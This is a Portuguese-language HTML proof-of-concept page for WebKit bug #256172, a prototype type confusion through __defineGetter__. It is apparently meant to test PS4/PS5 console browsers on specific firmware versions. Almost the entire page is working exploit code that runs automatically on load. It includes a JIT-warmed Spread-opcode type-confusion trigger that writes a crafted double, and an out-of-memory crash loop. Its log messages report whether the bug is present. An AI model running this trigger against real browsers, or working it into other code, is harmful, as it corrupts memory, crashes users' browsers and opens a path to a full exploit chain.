<!DOCTYPE html>
<!--
  PoC: WebKit Bug #256172 — __defineGetter__ prototype Type Confusion
  CVE: sem CVE oficial / CVE-2023-37450 (variante)

  DESCRIÇÃO:
  O engine assume que a propriedade "prototype" de uma função é
  non-configurable. Através de __defineGetter__ numa subclasse de
  Function é possível torná-la configurável (OOL property).
  O Spread opcode (...arr) usa AI analysis e marca o nó como seguro
  baseado nessa suposição — causando type confusion.

  CONFIRMADO: PS4 FW 10.00 a 11.02 / PS5 FW 6.00 a 8.60 (Zecoxao)
  STATUS FW 13.04: NÃO TESTADO

  Créditos: ENKI WhiteHat, Zecoxao
-->
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Bug #256172 — __defineGetter__ prototype</title>
<style>
  body{background:#0a0a0a;color:#ccc;font-family:monospace;padding:16px;margin:0;font-size:13px}
  #log{background:#111;border:1px solid #333;padding:10px;height:76vh;overflow-y:auto;font-size:11px;line-height:1.8}
  .ok{color:#00ff88}.fail{color:#ff4444}.info{color:#ffcc44}.warn{color:#ff8844}
  .vuln{color:#ff44ff;font-weight:bold}.patched{color:#44aaff}.dim{color:#555}
  .bar{background:#0a1a0a;border:1px solid #1a3a1a;color:#44aa44;padding:6px 10px;margin-bottom:8px;font-size:11px}
</style>
</head>
<body>
<div style="color:#aaa;font-size:12px;margin-bottom:6px">WebKit Bug #256172 · __defineGetter__ prototype · FW 13.04</div>
<div class="bar" id="bar">Iniciando...</div>
<div id="log"></div>
<script>
"use strict";
var logEl=document.getElementById('log'),barEl=document.getElementById('bar');
function L(m,c){logEl.innerHTML+='<div class="'+(c||'dim')+'">'+m+'</div>';logEl.scrollTop=logEl.scrollHeight;}
function bar(m){barEl.textContent=m;}

function run(){
  L('WebKit Bug #256172 — __defineGetter__ prototype Type Confusion','info');
  L('Confirmado PS4 FW 10.00-11.02 por Zecoxao. Testando FW 13.04...','info');
  L('','');

  // ── Teste 1: detecção básica (PoC de Zecoxao) ──────────────
  L('[1/3] Teste básico __defineGetter__ em prototype...','warn');
  bar('[1/3] Testando __defineGetter__...');
  var test1_threw = false;
  try {
    (function(){
      class MyFunction extends Function {
        constructor(){super();super.prototype=1;}
      }
      function test1(){
        var f=new MyFunction();
        f.__defineGetter__("prototype",function(){});
      }
      test1();
    })();
    L('[1/3] __defineGetter__ não lançou exceção — COMPORTAMENTO ANÔMALO','vuln');
  } catch(e) {
    test1_threw = true;
    L('[1/3] Lançou exceção: '+e,'patched');
    L('[1/3] Comportamento patched — deveria lançar TypeError','patched');
  }

  // ── Teste 2: confusão de tipo via Spread ───────────────────
  L('','');
  L('[2/3] Testando type confusion via Spread opcode...','warn');
  bar('[2/3] Testando Spread type confusion...');
  setTimeout(function(){
    try {
      var crashed = false;
      var victim = [1.1, 2.2, 3.3];
      var arr = [1,2,3];

      class Base extends Function {
        constructor(){super();super.prototype=1;}
      }
      var b = new Base();

      function opt(flag){
        victim[0]=13.37; victim[1]=13.37;
        if(flag){ try{[...arr];}catch(e){} }
        victim[1]=3.54484805889626e-310;
      }

      try {
        Object.defineProperty(arr,0,{value:1.1,configurable:false,writable:true});
      } catch(e){}

      try {
        b.__defineGetter__("prototype",function(){victim[1]={};});
      } catch(e){
        L('[2/3] __defineGetter__ bloqueado: '+e,'patched');
      }

      for(var i=0;i<0x4000;i++){ try{opt(false);}catch(e){} }

      arr[0]=b.prototype;
      try{ opt(true); } catch(e){ crashed=true; }

      var result = victim[1]+1;
      if(typeof result==='number' && !isNaN(result) && result===result){
        L('[2/3] victim[1]+1 = '+result+' — resultado normal','patched');
      } else {
        L('[2/3] victim[1]+1 = '+result+' — TIPO INESPERADO, type confusion!','vuln');
      }
    } catch(e){
      L('[2/3] Exceção na fase de trigger: '+e,'warn');
    }

    // ── Teste 3: OOM trigger (PoC original Zecoxao) ──────────
    L('','');
    L('[3/3] Trigger OOM (PoC original Zecoxao)...','warn');
    L('[3/3] SE O BROWSER FECHAR = CVE PRESENTE','vuln');
    bar('[3/3] OOM trigger...');
    setTimeout(function(){
      try {
        class MF extends Function {
          constructor(){super();super.prototype=1;}
        }
        function test2(i){
          var f=new MF();
          try{f.__defineGetter__("prototype",function(){});}catch(e){}
          f.prototype.x=i;
        }
        for(var j=0;j<10000;j++) test2(j);
        L('[3/3] Sobreviveu ao loop — provavelmente patched','patched');
      } catch(e){
        L('[3/3] Exceção: '+e,'warn');
      }
      L('','');
      L('══════════════════════════════════','warn');
      L('CRASH/OOM = Bug #256172 PRESENTE','vuln');
      L('Sem crash + exceções = PATCHED','patched');
      L('══════════════════════════════════','warn');
      bar('DONE');
    },200);
  },200);
}
window.addEventListener('load',function(){setTimeout(run,300);});
</script>
</body>
</html>
